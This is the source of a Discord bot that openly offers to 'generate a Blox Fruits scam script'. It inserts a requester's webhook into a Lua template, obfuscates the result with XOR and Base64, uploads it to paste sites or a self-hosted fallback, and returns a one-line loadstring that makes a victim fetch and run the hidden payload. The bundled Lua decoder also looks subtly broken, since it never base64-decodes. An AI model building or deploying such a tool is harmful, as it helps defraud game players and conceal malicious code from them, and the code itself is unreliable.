const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const express = require('express');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

// ----- Web server (health check & self‑host fallback) -----
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is alive!'));

// Self‑host storage (fallback)
const STORE_FILE = path.join(__dirname, 'scripts.json');
let scripts = new Map();
if (fs.existsSync(STORE_FILE)) {
    try {
        const data = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
        const now = Date.now();
        for (const [id, entry] of Object.entries(data)) {
            if (now < entry.expires) scripts.set(id, entry);
        }
    } catch (e) {}
}
function saveScripts() {
    const obj = Object.fromEntries(scripts);
    fs.writeFileSync(STORE_FILE, JSON.stringify(obj, null, 2));
}
app.get('/script/:id', (req, res) => {
    const id = req.params.id;
    const entry = scripts.get(id);
    if (!entry || Date.now() > entry.expires) {
        scripts.delete(id);
        saveScripts();
        return res.status(404).send('Script not found or expired.');
    }
    res.set('Content-Type', 'text/plain');
    res.send(entry.content);
});
app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));

// ----- Public URL for self‑host fallback -----
const BASE_URL = process.env.RENDER_EXTERNAL_URL || process.env.RENDER_URL;
if (BASE_URL) {
    console.log(`🌐 Public base URL: ${BASE_URL}`);
    setInterval(() => axios.get(BASE_URL).catch(() => {}), 4 * 60 * 1000);
    setTimeout(() => axios.get(BASE_URL).catch(() => {}), 5000);
} else {
    console.log('⚠️ No RENDER_EXTERNAL_URL set – self‑host fallback disabled.');
}

// ----- Discord Bot -----
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    const command = new SlashCommandBuilder()
        .setName('script')
        .setDescription('Generate a Blox Fruits scam script with your webhook')
        .addStringOption(option =>
            option.setName('game')
                .setDescription('Game name (only "bloxfruits" for now)')
                .setRequired(true)
                .addChoices({ name: 'Blox Fruits', value: 'bloxfruits' }))
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Your Discord username (for tracking)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Your Discord webhook URL')
                .setRequired(true));

    client.application.commands.create(command);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName !== 'script') return;

    await interaction.deferReply({ ephemeral: true });

    const game = interaction.options.getString('game');
    const username = interaction.options.getString('username');
    const webhook = interaction.options.getString('webhook');

    if (game !== 'bloxfruits') {
        return interaction.editReply({ content: '❌ Only "bloxfruits" is supported right now.' });
    }
    if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
        return interaction.editReply({ content: '❌ Invalid Discord webhook URL.' });
    }

    try {
        // Read template
        const templatePath = path.join(__dirname, 'template.lua');
        if (!fs.existsSync(templatePath)) {
            return interaction.editReply({ content: '❌ Template file `template.lua` not found.' });
        }
        let template = fs.readFileSync(templatePath, 'utf8');
        template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
        template = template.replace(/\{\{USERNAME\}\}/g, username);

        // Obfuscate
        const obfuscated = obfuscateScript(template);

        // Upload – returns { rawUrl, service }
        const result = await uploadScript(obfuscated);
        if (!result) {
            return interaction.editReply({ 
                content: '❌ All paste services failed. Please set RENDER_EXTERNAL_URL in environment variables to enable self‑host fallback.' 
            });
        }

        const { rawUrl, service } = result;
        // Clean the URL (remove any accidental whitespace)
        const cleanUrl = rawUrl.trim();
        // Build the loadstring – exactly one line, no extra parentheses
        const loadstringLine = `loadstring(game:HttpGet("${cleanUrl}"))()`;

        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('✅ Script Generated')
            .setDescription(`**Game:** ${game}\n**User:** ${username}`)
            .addFields(
                { 
                    name: '📜 Loadstring (copy this)', 
                    value: `\`\`\`lua\n${loadstringLine}\n\`\`\``,
                    inline: false 
                },
                { 
                    name: '📦 Hosted on', 
                    value: service, 
                    inline: false 
                },
                { 
                    name: '🔒 Obfuscation', 
                    value: 'XOR + Base64', 
                    inline: false 
                }
            )
            .setTimestamp();

        await interaction.editReply({ embeds: [embed] });

        // If self‑host was used, ping to keep alive
        if (service === 'Self‑host (fallback)' && BASE_URL) {
            axios.get(BASE_URL).catch(() => {});
        }

    } catch (error) {
        console.error(error);
        await interaction.editReply({ content: '❌ Failed to generate script: ' + error.message });
    }
});

// ----- Upload function with fallbacks (Pastefy first, then others) -----
async function uploadScript(content) {
    const services = [
        { name: 'Pastefy (never expires)', upload: uploadPastefy },
        { name: 'Rentry.co', upload: uploadRentry },
        { name: 'MSK.PW', upload: uploadMSK },
        { name: 'Hastebin', upload: uploadHastebin }
    ];

    for (const svc of services) {
        try {
            const rawUrl = await svc.upload(content);
            if (rawUrl) {
                console.log(`✅ Uploaded to ${svc.name}: ${rawUrl}`);
                return { rawUrl, service: svc.name };
            }
        } catch (e) {
            console.warn(`⚠️ ${svc.name} failed:`, e.message);
        }
    }

    // Fallback: self‑host
    if (BASE_URL) {
        const id = uuidv4();
        scripts.set(id, {
            content: content,
            expires: Date.now() + 24 * 60 * 60 * 1000
        });
        saveScripts();
        const rawUrl = `${BASE_URL}/script/${id}`;
        return { rawUrl, service: 'Self‑host (fallback)' };
    }

    return null; // all failed
}

// ----- Service uploaders -----
async function uploadPastefy(content) {
    const res = await axios.post('https://pastefy.app/api/v2/paste', {
        content: content,
        encryption: false,
        expiration: 'never'
    }, { timeout: 10000 });
    if (res.data && res.data.id) {
        return `https://pastefy.app/raw/${res.data.id}`;
    }
    throw new Error('Invalid response');
}

async function uploadRentry(content) {
    const res = await axios.post('https://rentry.co/api/new', { text: content }, { timeout: 10000 });
    if (res.data && res.data.url) {
        const slug = res.data.url.split('/').pop();
        return `https://rentry.co/raw/${slug}`;
    }
    throw new Error('Invalid response');
}

async function uploadMSK(content) {
    const res = await axios.post('https://msk.pw/api/paste', { text: content }, { timeout: 10000 });
    if (res.data && res.data.id) {
        return `https://msk.pw/raw/${res.data.id}`;
    }
    throw new Error('Invalid response');
}

async function uploadHastebin(content) {
    const res = await axios.post('https://hastebin.com/documents', content, {
        headers: { 'Content-Type': 'text/plain' },
        timeout: 10000
    });
    if (res.data && res.data.key) {
        return `https://hastebin.com/raw/${res.data.key}`;
    }
    throw new Error('Invalid response');
}

// ----- Obfuscator (XOR + Base64) -----
function obfuscateScript(raw) {
    const key = Math.floor(Math.random() * 254) + 1;
    let xorEncoded = '';
    for (let i = 0; i < raw.length; i++) {
        xorEncoded += String.fromCharCode(raw.charCodeAt(i) ^ key);
    }
    const base64 = Buffer.from(xorEncoded, 'binary').toString('base64');
    return `-- Obfuscated with XOR + Base64
local function decode(str, key)
    local result = ""
    for i = 1, #str do
        result = result .. string.char(string.byte(str, i) ~ key)
    end
    return result
end

local encoded = "${base64}"
local key = ${key}
local decoded = decode(encoded, key)
loadstring(decoded)()
`;
}

client.login(process.env.DISCORD_TOKEN);
